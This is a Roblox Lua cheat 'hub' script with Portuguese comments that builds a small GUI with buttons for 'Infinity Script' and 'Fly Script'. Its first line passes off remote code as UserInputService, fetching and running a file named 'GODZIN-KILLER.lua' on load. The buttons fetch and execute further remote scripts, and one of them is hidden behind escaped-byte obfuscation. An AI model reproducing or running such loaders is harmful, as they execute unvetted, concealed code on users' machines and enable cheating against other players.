local UserInputService = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nandoladogral/Nandoladogral/refs/heads/main/GODZIN-KILLER.lua"))()

-- Criação da ScreenGui
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")
local InfinityButton = Instance.new("TextButton")
local FlyButton = Instance.new("TextButton")
local OutputLabel = Instance.new("TextLabel")

-- Configurações da ScreenGui
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Configurações do Frame Principal
MainFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false  -- Começa escondido
MainFrame.Parent = ScreenGui

-- Configurações do Título
TitleLabel.Size = UDim2.new(1, 0, 0.2, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.Text = "GODZIN Hub [v1]"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextScaled = true
TitleLabel.Parent = MainFrame

-- Configurações do Botão de Toggle
ToggleButton.Size = UDim2.new(0.1, 0, 0.1, 0)
ToggleButton.Position = UDim2.new(0.9, 0, 0, 0)
ToggleButton.Text = "➖️"
ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextScaled = true
ToggleButton.Parent = ScreenGui

-- Configurações do Botão Infinity Script
InfinityButton.Size = UDim2.new(0.8, 0, 0.2, 0)
InfinityButton.Position = UDim2.new(0.1, 0, 0.25, 0)
InfinityButton.Text = "Infinity Script"
InfinityButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
InfinityButton.TextColor3 = Color3.fromRGB(255, 255, 255)
InfinityButton.TextScaled = true
InfinityButton.Parent = MainFrame

-- Configurações do Botão Fly Script
FlyButton.Size = UDim2.new(0.8, 0, 0.2, 0)
FlyButton.Position = UDim2.new(0.1, 0, 0.5, 0)
FlyButton.Text = "Fly Script"
FlyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
FlyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyButton.TextScaled = true
FlyButton.Parent = MainFrame

-- Configurações do Output Label
OutputLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
OutputLabel.Position = UDim2.new(0.1, 0, 0.75, 0)
OutputLabel.Text = ""
OutputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
OutputLabel.BackgroundTransparency = 1
OutputLabel.TextScaled = true
OutputLabel.Parent = MainFrame

-- Função para mover a UI
local dragging
local dragInput
local startPos

local function onInputBegan(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        startPos = input.Position - MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end

local function onInputChanged(input)
    if dragging then
        MainFrame.Position = UDim2.new(0, input.Position.X - startPos.X, 0, input.Position.Y - startPos.Y)
    end
end

UserInputService.InputBegan:Connect(onInputBegan)
UserInputService.InputChanged:Connect(onInputChanged)

-- Ação do botão Infinity Script
InfinityButton.MouseButton1Click:Connect(function()
    local success, result = pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end)
    OutputLabel.Text = success and "Infinity Script Executado!" or "Erro: " .. result
end)

-- Ação do botão Fly Script
FlyButton.MouseButton1Click:Connect(function()
    local success, result = pcall(function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
    end)
    OutputLabel.Text = success and "Fly Script Executado!" or "Erro: " .. result
end)

-- Ação do botão de toggle
ToggleButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
    ToggleButton.Text = MainFrame.Visible and "❎️" or "❎️"  -- Troca o ícone
end)
